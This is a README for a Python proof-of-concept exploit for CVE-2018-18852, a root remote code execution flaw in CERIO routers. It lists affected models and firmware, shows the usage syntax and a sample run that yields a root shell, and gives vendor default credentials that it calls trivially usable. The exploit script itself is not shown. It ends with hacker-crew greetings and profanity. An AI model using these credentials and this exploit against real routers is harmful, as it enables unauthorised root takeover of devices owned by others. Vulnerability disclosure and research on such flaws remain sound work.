# CERIO router Authenticated RCE (backdoor vendor creds) CVE-2018-18852 Python PoC
hook-s3c (github.com/hook-s3c), @hook_s3c on twitter

Working Python PoC for CVE-2018-18852, originally appearing on;
https://github.com/hook-s3c/CVE-2018-18852

## What's up

CERIO Router models and variants of, DT300N, DT100G, AMR-3204, WMR-200N are 
vulnerable to an authenticated web-based RCE as root user.

Exists as an 0day undisclosed advisory;
https://www.fortiguard.com/zeroday/FG-VD-18-149

Vendor default credentials are usually present, so execution is trivial.

Architecture is MIPS. 


### Usage and example

```
Usage: exploit.py <ipaddress> <port> <creds>
```

```bash

$ python ./exploit.py 127.0.0.1 8080 admin:admin

[*] ================================================
[*] CERIO RCE CVE-2018-18852, confirmed on;
[*] - CERIO DT-300N-NGS-M - fw: Pme-CPE-AP12X V1.0.3
[*] - CERIO DT-300N       - fw: Cen-CPE-N2H10A V1.0.14, Cen-CPE-N2H10A V1.1.6, Cen-CPE-N2H10A V1.1.7
[*] - CERIO DT-100G-N     - fw: Cen-AP-N2H10A V1.0.8
[*] - CERIO DT-100G       - fw: Cen-WR-G2H5 V1.0.7
[*] - CERIO DT-100GX-N    - fw: Cen-AP-N2H8A V1.0.18
[*] - CERIO AMR-3204G     - fw: Cen-AC V2.0.19
[*] - CERIO WMR-200N      - fw: Cen-HS-N2H1 V1.0.6c Test
[*]
[/] by hook (@hook_s3c) https://github.com/hook-s3c/CVE-2018-18852
[/] Greetz to vap0rsquad, ThugCrowd, $noHat$, r0bl0xgang, Udderly Amoosing, illmob, 
[/] The Many Hats Club, Cyber.Phunk, WAC, SHAM, 0x00sec, John McAfee
[/] Go cop YTCracker's Introducing Neals, gov overreach is no joke - wake the fuck up
[*] ================================================

root@cerio:~# id
[!] This may not be the right model (DT-300N-NGS-M), trying again
[+] Sucessfully grabbed pid token: 1312


uid=0(root) gid=0(root)

root@cerio:~# 

```

### Default cred combos;

- operator:1234
- admin:admin
- root:default

## Greetz

Shoutout to vap0rsquad, ThugCrowd, $noHat$, r0bl0xgang, Udderly Amoosing, illmob, The Many Hats Club, Cyber.Phunk, WAC, SHAM, 0x00sec, John McAfee
Go cop YTCracker's Introducing Neals, gov overreach is no joke - wake the fuck up

HTP!!!! YEET
